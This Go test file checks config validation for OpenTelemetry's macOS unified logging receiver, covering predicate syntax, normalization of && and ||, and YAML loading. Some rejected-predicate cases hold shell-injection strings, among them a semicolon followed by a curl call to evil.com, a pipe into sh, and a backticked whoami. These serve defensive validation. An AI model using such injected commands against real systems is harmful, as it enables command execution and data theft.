// Copyright The OpenTelemetry Authors
// SPDX-License-Identifier: Apache-2.0

//go:build darwin

package macosunifiedloggingreceiver

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"go.opentelemetry.io/collector/component"
	"go.opentelemetry.io/collector/confmap/confmaptest"
)

func TestConfigValidate(t *testing.T) {
	testCases := []struct {
		desc    string
		makeCfg func(t *testing.T) *Config
		// omitStorage keeps the loop from supplying a StorageID, for the cases that are about
		// its absence. Every other case exercises an unrelated field and would otherwise trip
		// the storage check before reaching what it means to test.
		omitStorage bool
		expectedErr string
	}{
		{
			desc: "storage is required",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{MaxPollInterval: 50 * time.Second}
			},
			omitStorage: true,
			expectedErr: "storage is required",
		},
		{
			desc: "min_poll_interval below the floor is rejected",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{MinPollInterval: time.Millisecond}
			},
			expectedErr: "must be at least 100ms",
		},
		{
			desc: "min_poll_interval at the floor is accepted",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{MinPollInterval: 100 * time.Millisecond}
			},
		},
		{
			desc: "min_poll_interval unset means default, not below the floor",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{}
			},
		},
		{
			desc: "valid config - live mode",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					MaxPollInterval: 50 * time.Second,
					MaxLogAge:       12 * time.Hour,
				}
			},
		},
		{
			desc: "valid predicate with AND",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'com.apple.example' AND messageType == 'Error'",
				}
			},
		},
		{
			desc: "valid predicate with && (normalized to AND)",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'com.apple.example' && messageType == 'Error'",
				}
			},
		},
		{
			desc: "valid predicate with || (normalized to OR)",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'com.apple.example' || messageType == 'Error'",
				}
			},
		},
		{
			desc: "valid predicate with comparison operators",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "processID > 100 && processID < 1000",
				}
			},
		},
		{
			desc: "valid predicate with > comparison and spaces",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "processID >100",
				}
			},
		},
		{
			desc: "invalid predicate - semicolon",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'test'; curl http://evil.com",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - pipe",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'test' | sh",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - dollar sign",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == '$HOME'",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - backtick",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == '`whoami`'",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "invalid predicate - append redirect",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem == 'test' >> /tmp/output",
				}
			},
			expectedErr: "predicate contains invalid character",
		},
		{
			desc: "predicate must contain valid field name",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "unknownField == 'value'",
				}
			},
			expectedErr: "predicate must contain at least one valid field name",
		},
		{
			desc: "predicate must contain operator",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "subsystem 'com.apple'",
				}
			},
			expectedErr: "predicate must contain at least one valid operator",
		},
		{
			desc: "predicate must contain valid event type when type is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "type == 'invalidEvent'",
				}
			},
			expectedErr: "predicate must contain at least one valid event type",
		},
		{
			desc: "predicate must contain valid log type when logType is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "logType == 'invalid'",
				}
			},
			expectedErr: "predicate must contain at least one valid log type",
		},
		{
			desc: "predicate must contain valid signpost scope when signpostScope is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "signpostScope == 'invalid'",
				}
			},
			expectedErr: "predicate must contain at least one valid signpost scope",
		},
		{
			desc: "predicate must contain valid signpost type when signpostType is referenced",
			makeCfg: func(_ *testing.T) *Config {
				return &Config{
					Predicate: "signpostType == 'invalid'",
				}
			},
			expectedErr: "predicate must contain at least one valid signpost type",
		},
	}

	storageID := component.MustNewID("file_storage")
	for _, tc := range testCases {
		t.Run(tc.desc, func(t *testing.T) {
			cfg := tc.makeCfg(t)
			if !tc.omitStorage {
				cfg.StorageID = &storageID
			}
			err := cfg.Validate()
			if tc.expectedErr != "" {
				require.ErrorContains(t, err, tc.expectedErr)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestPredicateNormalization(t *testing.T) {
	storageID := component.MustNewID("file_storage")
	cfg := &Config{
		Predicate: "subsystem == 'test' && processID > 100 && messageType == 'Error'",
		StorageID: &storageID,
	}

	err := cfg.Validate()
	require.NoError(t, err)

	// Verify && was replaced with AND
	require.Equal(t, "subsystem == 'test' AND processID > 100 AND messageType == 'Error'", cfg.Predicate)
	require.NotContains(t, cfg.Predicate, "&&")
}

func TestLoadConfigFromYAML(t *testing.T) {

	testCases := []struct {
		name           string
		configKey      string
		expectedPred   string
		expectedStart  string
		expectedPoll   time.Duration
		expectedMaxAge time.Duration
	}{
		{
			name:           "live mode defaults",
			configKey:      "live_mode_defaults",
			expectedPoll:   30 * time.Second,
			expectedMaxAge: 24 * time.Hour,
		},
		{
			name:           "live mode with predicate",
			configKey:      "live_mode_predicate",
			expectedPred:   "process == 'kernel' AND messageType == 'Error'",
			expectedPoll:   15 * time.Second,
			expectedMaxAge: 12 * time.Hour,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Load the config from YAML file
			cm, err := confmaptest.LoadConf(filepath.Join("testdata", "test_config.yaml"))
			require.NoError(t, err)

			// Get the specific config section
			sub, err := cm.Sub(tc.configKey)
			require.NoError(t, err)

			// Unmarshal into Config struct
			cfg := &Config{}
			err = sub.Unmarshal(cfg)
			require.NoError(t, err)

			// Verify the config values were parsed correctly
			require.Equal(t, tc.expectedPred, cfg.Predicate, "predicate mismatch")
			require.Equal(t, tc.expectedStart, cfg.StartTime, "start_time mismatch")

			// storage is a *component.ID, so unlike the other fields it round-trips through
			// component.ID's TextUnmarshaler; assert the "type/name" form actually parses.
			require.NotNil(t, cfg.StorageID, "storage did not unmarshal")
			require.Equal(t, "file_storage/default", cfg.StorageID.String(), "storage mismatch")

			if tc.expectedPoll > 0 {
				require.Equal(t, tc.expectedPoll, cfg.MaxPollInterval, "max_poll_interval mismatch")
			}
			if tc.expectedMaxAge > 0 {
				require.Equal(t, tc.expectedMaxAge, cfg.MaxLogAge, "max_log_age mismatch")
			}

			// Validate the config (should pass for valid configs)
			err = cfg.Validate()
			require.NoError(t, err)
		})
	}
}

func TestHasValidEventType(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid event type - activityCreateEvent",
			predicate: "type == 'activityCreateEvent'",
			expected:  true,
		},
		{
			name:      "contains invalid event type",
			predicate: "type == 'invalidEvent'",
			expected:  false,
		},
		{
			name:      "does not contain event type field",
			predicate: "subsystem == 'com.apple.example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains event type in complex predicate",
			predicate: "type == 'logEvent' AND subsystem == 'com.apple.example'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidEventType(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestHasValidLogType(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid log type - default",
			predicate: "logType == 'default'",
			expected:  true,
		},
		{
			name:      "contains valid log type - release",
			predicate: "logType == 'release'",
			expected:  true,
		},
		{
			name:      "contains valid log type - info",
			predicate: "logType == 'info'",
			expected:  true,
		},
		{
			name:      "contains valid log type - debug",
			predicate: "logType == 'debug'",
			expected:  true,
		},
		{
			name:      "contains valid log type - error",
			predicate: "logType == 'error'",
			expected:  true,
		},
		{
			name:      "contains valid log type - fault",
			predicate: "logType == 'fault'",
			expected:  true,
		},
		{
			name:      "contains invalid log type",
			predicate: "logType == 'invalid'",
			expected:  false,
		},
		{
			name:      "does not contain logType field",
			predicate: "subsystem == 'com.apple.example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains log type in complex predicate",
			predicate: "logType == 'error' AND subsystem == 'com.apple.example'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidLogType(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestHasValidSignpostScope(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid signpost scope - thread",
			predicate: "signpostScope == 'thread'",
			expected:  true,
		},
		{
			name:      "contains valid signpost scope - process",
			predicate: "signpostScope == 'process'",
			expected:  true,
		},
		{
			name:      "contains valid signpost scope - system",
			predicate: "signpostScope == 'system'",
			expected:  true,
		},
		{
			name:      "contains invalid signpost scope",
			predicate: "signpostScope == 'invalid'",
			expected:  false,
		},
		{
			name:      "does not contain signpostScope field",
			predicate: "category == 'example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains signpost scope in complex predicate",
			predicate: "signpostScope == 'thread' AND type == 'signpostEvent'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidSignpostScope(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}

func TestHasValidSignpostType(t *testing.T) {
	testCases := []struct {
		name      string
		predicate string
		expected  bool
	}{
		{
			name:      "contains valid signpost type - event",
			predicate: "signpostType == 'event'",
			expected:  true,
		},
		{
			name:      "contains valid signpost type - begin",
			predicate: "signpostType == 'begin'",
			expected:  true,
		},
		{
			name:      "contains valid signpost type - end",
			predicate: "signpostType == 'end'",
			expected:  true,
		},
		{
			name:      "contains invalid signpost type",
			predicate: "signpostType == 'invalid'",
			expected:  false,
		},
		{
			name:      "does not contain signpostType field",
			predicate: "subsystem == 'com.apple.example'",
			expected:  false,
		},
		{
			name:      "empty predicate",
			predicate: "",
			expected:  false,
		},
		{
			name:      "contains signpost type in complex predicate",
			predicate: "signpostType == 'begin' AND signpostScope == 'thread'",
			expected:  true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := hasValidSignpostType(tc.predicate)
			require.Equal(t, tc.expected, result)
		})
	}
}
